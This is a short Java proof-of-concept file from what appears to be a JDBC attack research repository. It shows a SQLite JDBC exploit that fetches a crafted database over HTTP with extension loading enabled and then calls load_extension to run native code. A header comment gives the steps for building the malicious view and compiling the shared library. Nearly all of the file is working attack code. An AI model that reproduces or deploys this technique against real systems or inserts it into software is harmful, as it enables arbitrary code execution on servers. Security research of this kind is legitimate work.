package org.example;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;

/**
 * 1. 创建数据库
 * sqlite3 poc.db
 * CREATE VIEW security as SELECT ( SELECT load_extension('/tmp/poc.so'));
 * .quit
 * 2. M1 编译 poc.c
 * arch -x86_64 gcc -shared -o poc.db.dylib poc.c
 *
 * @author Whoopsunix
 */
public class DBAttack2 {
    public static void main(String[] args) throws Exception {
        Class.forName("org.sqlite.JDBC");
        Connection connection = DriverManager.getConnection("jdbc:sqlite::resource:http://127.0.0.1:1234/poc.db?enable_load_extension=true");

        connection.setAutoCommit(true);
        Statement statement = connection.createStatement();
        statement.execute("SELECT load_extension('/Users/ppp/Documents/pppRepository/github_file/JavaRce/JDBCAttack/SqliteAttack/src/main/resources/poc.db')");

        statement.close();
        connection.close();
    }
}
